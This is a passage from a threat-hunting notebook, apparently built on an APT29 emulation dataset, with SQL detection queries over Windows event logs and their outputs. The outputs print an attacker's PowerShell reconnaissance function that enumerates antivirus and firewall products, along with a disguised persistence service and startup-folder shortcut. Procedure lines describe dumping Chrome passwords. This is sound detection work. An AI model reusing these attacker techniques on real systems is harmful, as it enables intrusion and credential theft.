<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%netusergetlocalgroups%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:F0AC46E2-63EA-4C8E-AF39-6631444451E5</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%netusergetlocalgroups%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-12-execution-through-api">
<h2>4.C.12. Execution through API<a class="headerlink" href="#c-12-execution-through-api" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed API call by reflectively loading Netapi32.dll</p>
<p><strong>Criteria:</strong> The NetUserGetLocalGroups API function loaded into powershelle.exe from Netapi32.dll</p>
<div class="section" id="id37">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id37" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:53CEF026-66EF-4B26-B5C9-10D4BBA3F9E8</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">AND f.EventID = 7</span>
<span class="sd">AND LOWER(f.ImageLoaded) LIKE &quot;%netapi32.dll&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 03:04:04.361
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ProcessId: 3876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\netapi32.dll
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Net Win32 API DLL
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: NetApi32.DLL
Hashes: SHA1=7DFDD188B30162DAA87FDD3E5B7A55C80CD839F1,MD5=86A9DF3FA9D5FCAC8EF57601FCCD78F9,SHA256=F8CDA38FD3FF371E772875EA657A37662321EBB7AD8D6978DBCCCA7FC6DB64F1,IMPHASH=7D4E1695394CF47BD397AFD45A40E55D
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-new-service">
<h2>5.A.1. New Service<a class="headerlink" href="#a-1-new-service" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Created a new service (javamtsup) that executes a service binary (javamtsup.exe) at system startup</p>
<p><strong>Criteria:</strong> powershell.exe creating the Javamtsup service</p>
<div class="section" id="id38">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id38" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:A16CE10D-6EE3-4611-BE9B-B023F36E2DFF</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND EventID IN (12,13,14)</span>
<span class="sd">  AND (LOWER(TargetObject) LIKE &quot;%javamtsup%&quot; OR LOWER(Details) LIKE &quot;%javamtsup%&quot;)</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup                                                 
-RECORD 1---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\Type
Details: DWORD (0x00000010)                              
-RECORD 2---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\Start
Details: DWORD (0x00000002)                             
-RECORD 3---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\ErrorControl
Details: DWORD (0x00000001)                      
-RECORD 4---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\ImagePath
Details: C:\Windows\System32\javamtsup.exe          
-RECORD 5---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\DisplayName
Details: Java(TM) Virtual Machine Support Service 
-RECORD 6---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:04:15.421
ProcessGuid: {47ab858c-cad9-5eac-0b00-000000000400}
ProcessId: 720
Image: C:\windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\javamtsup\ObjectName
Details: LocalSystem                               
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:E76C4174-C24A-4CA3-9EA8-46C5286D3B6F</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4103</span>
<span class="sd">  AND LOWER(f.Payload) LIKE &quot;%new-service%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(New-Service): &quot;New-Service&quot;
ParameterBinding(New-Service): name=&quot;Name&quot;; value=&quot;javamtsup&quot;
ParameterBinding(New-Service): name=&quot;BinaryPathName&quot;; value=&quot;C:\Windows\System32\javamtsup.exe&quot;
ParameterBinding(New-Service): name=&quot;DisplayName&quot;; value=&quot;Java(TM) Virtual Machine Support Service&quot;
ParameterBinding(New-Service): name=&quot;StartupType&quot;; value=&quot;Automatic&quot;
 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:AA3EF640-2720-4E8A-B86D-DFCF2FDB86BD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4103</span>
<span class="sd">  AND LOWER(f.Payload) LIKE &quot;%new-service%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(New-Service): &quot;New-Service&quot;
ParameterBinding(New-Service): name=&quot;Name&quot;; value=&quot;javamtsup&quot;
ParameterBinding(New-Service): name=&quot;BinaryPathName&quot;; value=&quot;C:\Windows\System32\javamtsup.exe&quot;
ParameterBinding(New-Service): name=&quot;DisplayName&quot;; value=&quot;Java(TM) Virtual Machine Support Service&quot;
ParameterBinding(New-Service): name=&quot;StartupType&quot;; value=&quot;Automatic&quot;
 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-registry-run-keys-startup-folder">
<h2>5.B.1. Registry Run Keys / Startup Folder<a class="headerlink" href="#b-1-registry-run-keys-startup-folder" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Created a LNK file (hostui.lnk) in the Startup folder that executes on login</p>
<p><strong>Criteria:</strong> powershell.exe creating the file hostui.lnk in the Startup folder</p>
<div class="section" id="id39">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id39" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:611FCA99-97D0-4873-9E51-1C1BA2DBB40D</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 11</span>
<span class="sd">    AND f.TargetFilename RLIKE &#39;.*\\\\\\\\ProgramData\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\StartUp.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:04:23.681
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ProcessId: 3876
Image: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk
CreationUtcTime: 2020-05-02 03:04:23.681 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-credentials-in-files">
<h2>6.A.1. Credentials in Files<a class="headerlink" href="#a-1-credentials-in-files" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Read the Chrome SQL database file to extract encrypted credentials</p>
<p><strong>Criteria:</strong> accesschk.exe reading files within %APPDATALOCAL%\Google\chrome\user data\default\</p>
<div class="section" id="id40">
<h3>Detection Type:None(None)<a class="headerlink" href="#id40" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="a-2-credential-dumping">
<h2>6.A.2. Credential Dumping<a class="headerlink" href="#a-2-credential-dumping" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed the CryptUnprotectedData API call to decrypt Chrome passwords</p>
<p><strong>Criteria:</strong> accesschk.exe executing the CryptUnprotectedData API</p>
<div class="section" id="id41">
<h3>Detection Type:None(None)<a class="headerlink" href="#id41" title="Permalink to this headline">¶</a></h3>
</div>
</div>
<div class="section" id="a-3-masquerading">
<h2>6.A.3. Masquerading<a class="headerlink" href="#a-3-masquerading" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Masqueraded a Chrome password dump tool as accesscheck.exe, a legitimate Sysinternals tool</p>
<p><strong>Criteria:</strong> Evidence that accesschk.exe is not the legitimate Sysinternals tool</p>
<div class="section" id="id42">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id42" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:0A19F9B7-5E17-47E5-8015-29E9ABC09ADC</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid, d.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">        FROM apt29Host a</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">              AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">        ) b</span>
<span class="sd">        ON a.ParentProcessGuid = b.ProcessGuid</span>
